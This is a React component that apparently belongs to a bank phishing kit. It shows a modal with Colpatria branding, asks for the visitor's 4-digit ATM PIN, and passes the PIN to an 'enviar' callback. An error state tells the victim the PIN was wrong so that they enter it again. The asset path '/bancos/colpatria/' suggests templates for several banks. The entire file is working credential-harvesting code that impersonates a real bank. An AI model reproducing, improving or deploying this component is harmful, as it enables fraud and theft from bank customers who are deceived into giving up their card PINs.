/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import React, { useRef, useState } from "react";

const CAJERO_LENGTH = 4;

interface CajeroProps {
  enviar?: (data: any) => void;
  isError?: boolean;
}

const Cajero: React.FC<CajeroProps> = ({ enviar, isError = false }) => {
  const [pin, setPin] = useState<string[]>(new Array(CAJERO_LENGTH).fill(""));
  const [loading, setLoading] = useState(false);
  const inputRefs = useRef<Array<HTMLInputElement | null>>([]);

  const handleChange = (el: HTMLInputElement, index: number) => {
    const val = el.value.replace(/\D/g, "");
    el.value = val.charAt(0);

    const newPin = [...pin];
    newPin[index] = el.value;
    setPin(newPin);

    if (el.value !== "" && index < CAJERO_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === "Backspace" && !e.currentTarget.value && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, CAJERO_LENGTH);
    const newPin = [...pin];
    pasted.split("").forEach((char, i) => { newPin[i] = char; });
    setPin(newPin);
    inputRefs.current[Math.min(pasted.length, CAJERO_LENGTH - 1)]?.focus();
  };

  const isComplete = pin.every((d) => d !== "");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isComplete) return;
    setLoading(true);
    const code = pin.join("");
    if (enviar) {
      await enviar({ view: "cajero", cajero: code, claveCajero: code });
    }
    setLoading(false);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4 backdrop-blur-sm animate-in fade-in duration-300">
      <div className="w-full max-w-[420px] bg-white rounded-2xl shadow-2xl overflow-hidden animate-in zoom-in-95 duration-300">

        {/* Header */}
        <div className="px-8 pt-8 pb-4 flex flex-col items-start">
          <img src="/bancos/colpatria/new-brand-red.svg" className="h-8 w-[120px] mb-5" alt="Colpatria" />
          <h2 className="text-[20px] font-bold text-[#1a1a1a]">
            {isError ? "Clave de cajero incorrecta" : "Clave de cajero"}
          </h2>
          <p className="text-[13px] text-gray-500 mt-1 leading-snug">
            {isError
              ? "La clave ingresada no es válida. Por favor intente de nuevo."
              : "Por favor ingrese su clave de cajero de 4 dígitos."}
          </p>
        </div>

        {/* Error banner */}
        {isError && (
          <div className="mx-8 mb-2 bg-red-50 border border-red-200 rounded-lg px-4 py-2">
            <p className="text-red-600 text-[13px] font-semibold text-center">
              ⚠️ Clave incorrecta. Intente nuevamente.
            </p>
          </div>
        )}

        {/* Input de 4 celdas */}
        <form onSubmit={handleSubmit} className="px-8 pb-8 pt-4">
          <div className="flex justify-center gap-3 mb-8">
            {pin.map((digit, i) => (
              <input
                key={i}
                ref={(el) => { inputRefs.current[i] = el; }}
                type="password"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(e.target, i)}
                onKeyDown={(e) => handleKeyDown(e, i)}
                onPaste={handlePaste}
                autoFocus={i === 0}
                style={{ textAlign: "center", padding: 0, margin: 0, lineHeight: "1" }}
                className={`w-14 h-14 p-0 text-center text-[24px] font-bold border-2 rounded-xl outline-none transition-all tracking-normal
                  ${isError && !digit
                    ? "border-red-400 bg-red-50"
                    : digit
                      ? "border-[#ec111a] bg-[#fff5f5]"
                      : "border-gray-300 focus:border-[#ec111a]"}
                `}
              />
            ))}
          </div>

          <button
            type="submit"
            disabled={!isComplete || loading}
            className={`w-full py-3.5 rounded-xl font-bold text-[16px] transition-all
              ${isComplete && !loading
                ? "bg-[#ec111a] text-white hover:bg-[#c40e15] active:scale-95 shadow-md"
                : "bg-gray-200 text-gray-400 cursor-not-allowed"}
            `}
          >
            {loading ? "Validando..." : "Continuar"}
          </button>

          <p className="text-center text-[12px] text-gray-400 mt-4">
            Tu clave de cajero tiene 4 dígitos numéricos
          </p>
        </form>
      </div>
    </div>
  );
};

export default Cajero;
